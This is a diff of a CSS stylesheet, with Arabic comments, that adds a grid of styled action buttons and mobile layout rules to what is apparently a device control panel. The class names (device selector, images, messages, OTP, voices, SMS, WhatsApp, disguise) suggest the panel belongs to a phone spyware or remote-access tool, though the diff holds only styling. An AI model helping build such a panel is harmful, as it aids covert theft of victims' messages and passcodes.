@@ -77,7 +77,6 @@ h1 {
     }
 }
 
-/* اسم الجهاز */
 .device-name-display {
     text-align: center;
     color: #FFD700;
@@ -156,6 +155,137 @@ h1 {
     background: #ff4444;
     color: #000;
     box-shadow: 0 0 25px rgba(255, 68, 68, 0.8);
+}
+
+/* ═══════════════════════════════════════════════════════
+   ACTION GRID — أزرار التحكم
+   ═══════════════════════════════════════════════════════ */
+.action-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+    gap: 8px;
+    margin-top: 15px;
+    padding: 10px;
+    background: #050505;
+    border-radius: 12px;
+    border: 1px solid #332800;
+}
+
+.action-btn-grid {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 10px 12px;
+    border: 1px solid;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: bold;
+    font-size: 12px;
+    color: #fff;
+    transition: all 0.25s;
+    position: relative;
+    text-align: right;
+    min-height: 44px;
+    background: #0a0a0a;
+    font-family: inherit;
+}
+
+.action-btn-grid .icon {
+    font-size: 18px;
+    flex-shrink: 0;
+}
+
+.action-btn-grid .text {
+    flex: 1;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+
+.action-btn-grid .badge {
+    background: #000;
+    padding: 2px 6px;
+    border-radius: 10px;
+    font-size: 10px;
+    font-weight: bold;
+    min-width: 20px;
+    text-align: center;
+    flex-shrink: 0;
+}
+
+.action-btn-grid:active {
+    transform: scale(0.96);
+}
+
+.style-images {
+    border-color: #00ffcc;
+    box-shadow: 0 0 10px rgba(0,255,204,0.3);
+}
+.style-images .badge { color: #00ffcc; }
+.style-images:hover {
+    background: linear-gradient(135deg, #00ffcc, #009977);
+    color: #000;
+    box-shadow: 0 0 18px rgba(0,255,204,0.7);
+}
+.style-images:hover .badge { background: #000; color: #00ffcc; }
+
+.style-msgs {
+    border-color: #ff0066;
+    box-shadow: 0 0 10px rgba(255,0,102,0.3);
+}
+.style-msgs .badge { color: #ff0066; }
+.style-msgs:hover {
+    background: linear-gradient(135deg, #ff0066, #cc0052);
+    box-shadow: 0 0 18px rgba(255,0,102,0.7);
+}
+
+.style-otp {
+    border-color: #ffcc00;
+    box-shadow: 0 0 10px rgba(255,204,0,0.3);
+}
+.style-otp .badge { color: #ffcc00; }
+.style-otp:hover {
+    background: linear-gradient(135deg, #ffcc00, #cc9900);
+    color: #000;
+    box-shadow: 0 0 18px rgba(255,204,0,0.7);
+}
+.style-otp:hover .badge { background: #000; color: #ffcc00; }
+
+.style-voices {
+    border-color: #00cc99;
+    box-shadow: 0 0 10px rgba(0,204,153,0.3);
+}
+.style-voices .badge { color: #00cc99; }
+.style-voices:hover {
+    background: linear-gradient(135deg, #00cc99, #006677);
+    box-shadow: 0 0 18px rgba(0,204,153,0.7);
+}
+
+.style-sms {
+    border-color: #25D366;
+    box-shadow: 0 0 10px rgba(37,211,102,0.3);
+}
+.style-sms:hover {
+    background: linear-gradient(135deg, #25D366, #128C7E);
+    box-shadow: 0 0 18px rgba(37,211,102,0.7);
+}
+
+.style-wa {
+    border-color: #128C7E;
+    box-shadow: 0 0 10px rgba(18,140,126,0.3);
+}
+.style-wa:hover {
+    background: linear-gradient(135deg, #128C7E, #075E54);
+    box-shadow: 0 0 18px rgba(18,140,126,0.7);
+}
+
+.style-disguise {
+    border-color: #9b59b6;
+    box-shadow: 0 0 10px rgba(155,89,182,0.3);
+}
+.style-disguise:hover {
+    background: linear-gradient(135deg, #9b59b6, #8e44ad);
+    box-shadow: 0 0 18px rgba(155,89,182,0.7);
 }
 
 /* ═══════════════════════════════════════════════════════
@@ -785,6 +915,19 @@ tr:hover td {
 /* ═══════════════════════════════════════════════════════
    RESPONSIVE
    ═══════════════════════════════════════════════════════ */
+@media (max-width: 500px) {
+    .action-grid {
+        grid-template-columns: repeat(2, 1fr);
+    }
+    .action-btn-grid {
+        font-size: 11px;
+        padding: 9px 10px;
+    }
+    .action-btn-grid .icon {
+        font-size: 16px;
+    }
+}
+
 @media (max-width: 768px) {
     h1 { font-size: 24px; letter-spacing: 3px; }
     .device-selector { flex-direction: column; }
@@ -796,4 +939,4 @@ tr:hover td {
     .images-grid { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
     .image-card .thumb { height: 120px; }
     .messages-list { max-height: 55vh; }
-          }
+   }
